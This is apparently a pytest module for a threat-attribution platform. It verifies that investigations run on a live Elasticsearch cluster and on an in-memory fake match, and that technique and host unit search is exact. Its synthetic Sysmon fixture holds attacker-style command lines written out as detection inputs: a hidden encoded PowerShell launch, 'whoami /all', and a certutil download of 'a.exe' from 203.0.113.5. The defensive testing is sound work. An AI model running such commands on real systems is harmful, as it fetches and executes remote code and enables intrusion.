"""Live Elasticsearch verification (ADR-0009): the same investigation run into
a real cluster and into the in-memory fake must serve identical read models,
and unit search must be exact with real Query DSL semantics.

Opt-in: skipped unless ``ATTRIBUTION_LIVE_ELASTICSEARCH=1`` and the cluster
variables of ``python -m attribution_platform.api`` are set (``ELASTIC_PASSWORD``,
``ELASTICSEARCH_CA_CERT``, ...) — see README "Live Elasticsearch verification".
Writes only the platform's own pinned indices; every id is deterministic, so a
re-run overwrites the same documents.
"""

from __future__ import annotations

import hashlib
import json
import os
import zipfile
from pathlib import Path
from typing import Any

import pytest

from attribution_platform.api.__main__ import elasticsearch_client_from_env
from attribution_platform.api.read_model import (
    get_evidence,
    get_investigation,
    get_unit,
    list_investigation_summaries,
    search_units,
)
from attribution_platform.attack_knowledge.loader import load_attack_knowledge
from attribution_platform.dataplane import ElasticClient, ElasticsearchHttpClient, FakeElasticClient
from attribution_platform.detection import DetectionEngine, load_rule_pack
from attribution_platform.domain.serialization import to_serializable
from attribution_platform.investigation import run_investigation
from attribution_platform.investigation.records import UNIT_SUMMARIES_INDEX, InvestigationRecord
from attribution_platform.replay.recording_pipeline import RecordingSource, load_recording_sources

REPO_ROOT = Path(__file__).resolve().parents[1]
RECORDINGS = REPO_ROOT / "data" / "calibration" / "corpus" / "v2" / "recordings.json"
SIGMA_PACK = (
    REPO_ROOT
    / "data"
    / "detection"
    / "sigma"
    / "r2026-07-01"
    / "generated"
    / "sigma-r2026-07-01-sigma_core++.rules.json"
)

pytestmark = pytest.mark.skipif(
    os.environ.get("ATTRIBUTION_LIVE_ELASTICSEARCH") != "1"
    or not os.environ.get("ELASTIC_PASSWORD"),
    reason="live Elasticsearch verification is opt-in (ATTRIBUTION_LIVE_ELASTICSEARCH=1)",
)


@pytest.fixture(scope="module")
def live() -> ElasticsearchHttpClient:
    client = elasticsearch_client_from_env(dict(os.environ))
    assert client is not None
    return client


@pytest.fixture(scope="module")
def engine_inputs() -> dict[str, Any]:
    knowledge = load_attack_knowledge()
    pack = load_rule_pack(SIGMA_PACK, knowledge=knowledge)
    return {
        "engine": DetectionEngine(rules=pack.rules),
        "knowledge": knowledge,
        "detection_pack_content_hash": pack.content_hash,
    }


def _refresh(client: ElasticsearchHttpClient) -> None:
    """Make every write searchable now (search is near-real-time; get is not)."""
    status, _ = client._request("POST", "/attribution-platform-*/_refresh", None)  # noqa: SLF001
    assert status == 200


def _run(
    source: RecordingSource, client: ElasticClient, inputs: dict[str, Any]
) -> InvestigationRecord:
    return run_investigation(source, client=client, **inputs)


def _assert_same_read_model(
    live: ElasticsearchHttpClient, fake: FakeElasticClient, record: InvestigationRecord
) -> None:
    assert get_investigation(live, record.investigation_id) == get_investigation(
        fake, record.investigation_id
    )
    for group_id in record.units:
        unit = get_unit(live, group_id)
        assert unit == get_unit(fake, group_id)
        for evidence_id in unit["group"]["member_evidence_ids"]:
            assert to_serializable(get_evidence(live, evidence_id)) == to_serializable(
                get_evidence(fake, evidence_id)
            )


def _pc(
    record_id: int, second: int, host: str, guid: str, parent: str, image: str, cmd: str
) -> dict[str, Any]:
    return {
        "@timestamp": f"2026-01-01T12:00:{second:02d}.000Z",
        "winlog": {
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "event_id": 1,
            "record_id": record_id,
            "computer_name": host,
            "event_data": {
                "UtcTime": f"2026-01-01 12:00:{second:02d}.000",
                "ProcessGuid": guid,
                "ProcessId": str(1000 + record_id),
                "Image": image,
                "CommandLine": cmd,
                "ParentProcessGuid": parent,
            },
        },
    }


@pytest.fixture(scope="module")
def two_hosts(tmp_path_factory: pytest.TempPathFactory) -> RecordingSource:
    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    whoami = "C:\\Windows\\System32\\whoami.exe"
    certutil = "C:\\Windows\\System32\\certutil.exe"
    records = [
        _pc(
            1, 1, "WS01.lab.local", "{P}", "{R}", ps, "powershell.exe -nop -w hidden -enc SQBFAFgA"
        ),
        _pc(2, 2, "WS01.lab.local", "{A}", "{P}", whoami, "whoami /all -all"),
        _pc(
            3,
            5,
            "WS02.lab.local",
            "{C}",
            "{R2}",
            certutil,
            "certutil.exe -urlcache -split -f http://203.0.113.5/a.exe a.exe",
        ),
        _pc(4, 6, "WS02.lab.local", "{D}", "{C}", whoami, "whoami /all -all"),
    ]
    path = tmp_path_factory.mktemp("live") / "live-two-hosts.zip"
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr("r.json", "\n".join(json.dumps(r) for r in records) + "\n")
    return RecordingSource(
        recording_id="live-two-hosts",
        path=path,
        sha256=hashlib.sha256(path.read_bytes()).hexdigest(),
        declared_sources={"WS01.lab.local": ("sysmon",), "WS02.lab.local": ("sysmon",)},
    )


def test_index_mappings_are_the_declared_types(
    live: ElasticsearchHttpClient, two_hosts: RecordingSource, engine_inputs: dict[str, Any]
) -> None:
    _run(two_hosts, live, engine_inputs)
    status, body = live._request("GET", f"/{UNIT_SUMMARIES_INDEX}/_mapping", None)  # noqa: SLF001
    assert status == 200
    properties = body[UNIT_SUMMARIES_INDEX]["mappings"]["properties"]
    for name in ("group_id", "investigation_id", "host_names", "technique_ids", "candidate_ids"):
        assert properties[name]["type"] == "keyword", name
    assert properties["first_seen"]["type"] == "date"


def test_read_model_matches_the_in_memory_run(
    live: ElasticsearchHttpClient, two_hosts: RecordingSource, engine_inputs: dict[str, Any]
) -> None:
    fake = FakeElasticClient()
    record = _run(two_hosts, live, engine_inputs)
    assert record == _run(two_hosts, fake, engine_inputs)
    _assert_same_read_model(live, fake, record)
    _refresh(live)
    listed = [s["investigation_id"] for s in list_investigation_summaries(live)]
    assert record.investigation_id in listed and listed == sorted(listed)


@pytest.mark.parametrize(
    ("params", "hosts"),
    [
        ({"technique": "T1059"}, [["ws01.lab.local"]]),  # parent technique
        ({"technique": "T1105"}, [["ws02.lab.local"]]),
        ({"technique": "T1033"}, [["ws01.lab.local"], ["ws02.lab.local"]]),
        ({"host": "WS02.LAB.LOCAL"}, [["ws02.lab.local"]]),
        ({"technique": "T1105", "host": "ws01.lab.local"}, []),
    ],
)
def test_unit_search_is_exact_on_the_cluster(
    live: ElasticsearchHttpClient,
    two_hosts: RecordingSource,
    engine_inputs: dict[str, Any],
    params: dict[str, str],
    hosts: list[list[str]],
) -> None:
    record = _run(two_hosts, live, engine_inputs)
    _refresh(live)
    body = search_units(live, {**params, "investigation": record.investigation_id})
    assert [u["host_names"] for u in body["units"]] == hosts


def test_capped_search_returns_the_earliest_unit(
    live: ElasticsearchHttpClient, two_hosts: RecordingSource, engine_inputs: dict[str, Any]
) -> None:
    record = _run(two_hosts, live, engine_inputs)
    _refresh(live)
    body = search_units(live, {"investigation": record.investigation_id, "limit": "1"})
    assert body["truncated"] is True
    assert [u["host_names"] for u in body["units"]] == [["ws01.lab.local"]]


def test_real_apt3_recording_round_trips(
    live: ElasticsearchHttpClient, engine_inputs: dict[str, Any]
) -> None:
    """Real OTRF telemetry: every Evidence, unit and analysis survives the
    cluster's dynamic mapping unchanged."""
    source = load_recording_sources(RECORDINGS, REPO_ROOT)["otrf-apt3-empire"]
    if not source.path.is_file():
        pytest.skip("the pinned APT3 recording is not in the local cache")
    fake = FakeElasticClient()
    record = _run(source, live, engine_inputs)
    assert record == _run(source, fake, engine_inputs)
    _assert_same_read_model(live, fake, record)
